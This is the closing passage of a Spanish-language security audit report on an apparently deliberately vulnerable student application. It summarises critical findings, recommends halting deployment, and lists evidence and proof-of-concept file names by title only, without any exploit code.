- **Cloudflare** - CDN con protección DDoS y WAF

---

## CONCLUSIONES

La aplicación **vulnerabilities_project_to_student.py** presenta múltiples vulnerabilidades de severidad crítica que permiten el **compromiso total del servidor** sin necesidad de autenticación.

### Hallazgos Clave:
- ✅ **6 vulnerabilidades CRÍTICAS** que permiten RCE
- ✅ **2 vulnerabilidades ALTAS** que exponen datos sensibles
- ✅ **1 vulnerabilidad MEDIA** de configuración insegura
- ❌ **0 controles de seguridad** implementados
- ❌ **No hay autenticación** en endpoints críticos
- ❌ **No hay validación** de inputs
- ❌ **No hay sanitización** de datos

### Riesgo para la Organización:
**CRÍTICO** - La aplicación NO debe ser desplegada en producción bajo ninguna circunstancia en su estado actual. Requiere una reescritura completa con enfoque de seguridad desde el diseño (Security by Design).

### Recomendación Final:
Se recomienda **detener el desarrollo** hasta implementar todas las correcciones P0 y P1. La aplicación debe pasar por una nueva auditoría de seguridad antes de cualquier despliegue.

---

## ANEXOS

### Anexo A: Archivos de Evidencia Generados
1. `evidencia_1_sql_injection.txt`
2. `evidencia_2_command_injection.txt`
3. `evidencia_3_rce_eval.txt`
4. `evidencia_4_deserialization.txt`
5. `evidencia_5_path_traversal.txt`
6. `evidencia_6_data_exposure.txt`
7. `evidencia_7_weak_crypto.txt`
8. `evidencia_8_cors.txt`
9. `evidencia_9_missing_auth.txt`

### Anexo B: Scripts de Explotación (PoC)
1. `exploit_sql_injection.py`
2. `exploit_command_injection.py`
3. `exploit_rce_eval.py`
4. `exploit_insecure_deserialization.py`
5. `exploit_path_traversal.py`
6. `exploit_sensitive_data_exposure.py`
7. `exploit_weak_crypto.py`
8. `exploit_cors_misconfiguration.py`
9. `exploit_missing_authentication.py`

### Anexo C: Referencias
- OWASP Top 10 2021: https://owasp.org/Top10/
- CWE Top 25: https://cwe.mitre.org/top25/
- ISO/IEC 27001:2022: Sistemas de gestión de la seguridad de la información
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework

---

**Fin del Informe**

---

**Auditor:** Security Team  
**Fecha:** 28 de Noviembre de 2025  
**Versión del Informe:** 1.0  
**Confidencialidad:** CONFIDENCIAL - Solo para uso interno

